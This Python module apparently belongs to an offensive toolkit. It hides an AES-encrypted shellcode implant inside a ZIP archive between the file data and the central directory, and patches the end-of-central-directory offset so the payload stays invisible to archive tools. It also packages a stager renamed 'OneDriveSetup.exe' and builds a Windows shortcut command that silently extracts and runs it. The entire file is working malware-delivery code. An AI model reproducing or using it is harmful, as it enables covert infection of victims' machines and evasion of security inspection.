# bab/zip.py — ZIP smuggling: inject encrypted shellcode between file data and CD

import io
import struct
import zipfile
from pathlib import Path

from .ui     import section, ok, err, info, grey
from .config import ROOT, IMPLANT_OUT, resolve_dir

_PAYLOAD_MAGIC = b'THORNPLD'

def _aes_cbc_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad as pkcs7_pad
    return AES.new(key, AES.MODE_CBC, iv).encrypt(pkcs7_pad(data, AES.block_size))

def _find_eocd(data: bytes) -> int:
    """Scan backward for the End of Central Directory signature (PK\\x05\\x06)."""
    sig = b'PK\x05\x06'
    for i in range(len(data) - 22, -1, -1):
        if data[i:i + 4] == sig:
            return i
    return -1

def _smuggle_into_zip(zip_bytes: bytes, payload: bytes) -> bytes:
    """Inject payload between file data and Central Directory.

    [local file data] → [payload] → [Central Directory] → [EOCD]
    The EOCD's Central Directory offset is patched so every ZIP tool sees a
    clean, normal archive. The payload is completely invisible.
    """
    eocd_off = _find_eocd(zip_bytes)
    if eocd_off == -1:
        raise ValueError("EOCD not found in ZIP")
    cd_off  = struct.unpack_from("<I", zip_bytes, eocd_off + 16)[0]
    new_zip = bytearray(zip_bytes[:cd_off] + payload + zip_bytes[cd_off:])
    new_eocd_off = eocd_off + len(payload)
    struct.pack_into("<I", new_zip, new_eocd_off + 16, cd_off + len(payload))
    return bytes(new_zip)

def zip_lnk_cmdline(zip_name: str, stager_name: str) -> str:
    """LNK command for ZIP-embedded delivery — no server download required."""
    zip_path    = f'%USERPROFILE%\\Downloads\\{zip_name}'
    stager_path = f'%USERPROFILE%\\Downloads\\{stager_name}'
    return (
        f'/c start /min cmd /c "'
        f'tar -xf {zip_path} -C %USERPROFILE%\\Downloads {stager_name} & '
        f'{stager_path}"'
    )

def embed_in_zip(cfg: dict) -> bool:
    section("Package Stager + Hidden Implant in ZIP")

    lnk_dir     = resolve_dir(cfg.get("lnk_output_dir", "backdoors/stagers"))
    stager_name = cfg.get("stager_filename", "stager_release.exe")
    stager_exe  = ROOT / "backdoors" / "stagers" / stager_name
    if not stager_exe.exists():
        stager_exe = ROOT / "backdoors" / "stagers" / "stager_release.exe"
    impl_name   = cfg.get("implant_filename", "")
    implant     = IMPLANT_OUT / ((impl_name + ".bin") if impl_name else "beacon.bin")
    if not implant.exists():
        implant = IMPLANT_OUT / "beacon.bin"

    missing = []
    if not stager_exe.exists():
        missing.append("stager_release.exe not found  → build with [3]")
    if not implant.exists():
        missing.append("beacon.bin not found  → build implant with [3]")
    if missing:
        for m in missing:
            err(m)
        return False

    stager_name = cfg.get("zip_stager_name", "OneDriveSetup.exe")
    zip_name    = cfg.get("zip_filename", "payload.zip")
    zip_path    = lnk_dir / zip_name
    lnk_dir.mkdir(parents=True, exist_ok=True)

    info(f"Adding {stager_name} to ZIP …")
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.write(stager_exe, stager_name)
    zip_bytes = buf.getvalue()

    payload   = implant.read_bytes()
    key       = cfg["key"].encode().ljust(32, b'\x00')[:32]
    iv        = cfg["iv"].encode().ljust(16,  b'\x00')[:16]
    try:
        encrypted = _aes_cbc_encrypt(payload, key, iv)
    except ImportError as e:
        err(str(e))
        return False
    info(f"Shellcode: {len(payload):,} bytes  →  AES-256-CBC encrypted: {len(encrypted):,} bytes")

    blob = _PAYLOAD_MAGIC + struct.pack("<I", len(encrypted)) + encrypted

    try:
        final_zip = _smuggle_into_zip(zip_bytes, blob)
    except ValueError as e:
        err(str(e))
        return False
    zip_path.write_bytes(final_zip)

    eocd_off = _find_eocd(zip_bytes)
    cd_off   = struct.unpack_from("<I", zip_bytes, eocd_off + 16)[0]

    rel = zip_path.relative_to(ROOT) if zip_path.is_relative_to(ROOT) else zip_path
    ok(f"{rel}  ({zip_path.stat().st_size // 1024} KB)")

    print()
    section("ZIP Structure")
    info(f"  [0 – {cd_off}]  local file data")
    info(f"  [{cd_off}]       → THORNPLD magic + uint32-LE length + XOR-encrypted implant  (invisible)")
    info(f"  [{cd_off + len(blob)}]  → Central Directory  (offset patched in EOCD)")
    print()
    info(f"  {stager_name: <28} stager  (visible in ZIP)")
    print()
    ok(f"Delivery package ready:  {rel}")
    return True
